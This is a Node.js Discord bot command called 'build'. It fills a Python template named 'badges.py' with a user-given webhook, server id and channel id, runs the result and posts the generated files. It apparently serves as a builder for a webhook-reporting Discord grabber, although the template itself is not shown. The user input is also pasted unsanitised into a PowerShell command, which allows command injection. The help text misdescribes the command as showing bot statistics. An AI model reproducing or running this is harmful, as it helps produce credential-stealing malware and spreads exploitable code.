const Discord = require("discord.js");
var cmd = require('node-cmd');
var randomstring = require("randomstring");
const prettyBytes = require('pretty-bytes');
const child_process = require('child_process');
var fs = require("fs"); //Load the filesystem module
const cooldown = new Set()

exports.run = async (client, message, args) => {

  function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }
  
if (!args[0] || !args[1] || !args[2]) {
  message.reply("Invalid arguments! Use:$s <token> <guildid> <channelid>");
} else {

  var rst = "1295"+randomstring.generate(3);
var injections = fs.readFileSync('./BuildBot/badges.py');


fs.writeFile(`./BuildBot/${rst}.py`, injections, (err) => {
  if (err)
    console.log(err);
  else {

      const islem = child_process.exec(`powershell -Command "(gc ./BuildBot/${rst}.py) -replace 'da_webhook', '${args[0]}' -replace 'randomnamesa', '${rst}'  -replace 'sunucuid', '${args[1]}' -replace 'kanalid', '${args[2]}'  | Out-File -encoding ASCII ./BuildBot/${rst}1.py`, function (error, stdout, stderr) {
      });
      
      islem.on('exit', function (code, signal) {

        sleep(1000);
        const islemgib = child_process.exec(`python ./BuildBot/${rst}1.py`, function (error, stdout, stderr) {
          if (error) throw error;
        });
        
        islemgib.on('exit', function (code, signal) {
        
          sleep(1000);
          const islem = child_process.exec(`cls`, function (error, stdout, stderr) {
          if (error) throw error;
          });
            islem.on('exit', function (code, signal) {
                sleep(1000);
            
       message.channel.send("yes", {
  files: [
    `./${rst}.txt`,
    `./${rst}1.txt`,
    `./${rst}2.txt`,
    `./${rst}4.txt`
  ]
});

                  function rsthengibi() {
                    fs.unlinkSync(`./BuildBot/${rst}.py`);
                    fs.unlinkSync(`./BuildBot/${rst}1.py`);
                  }
            setTimeout(rsthengibi, 10000);
            //setTimeout(selamVer, 90000);
            })
          });

    });
  }
});
}

};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["s"],
  permLevel: 0
};

exports.help = {
  name: "build",
  cooldown: "6",
  description: "Botun istatistiklerini gösterir",
  usage: "istatistik"
};
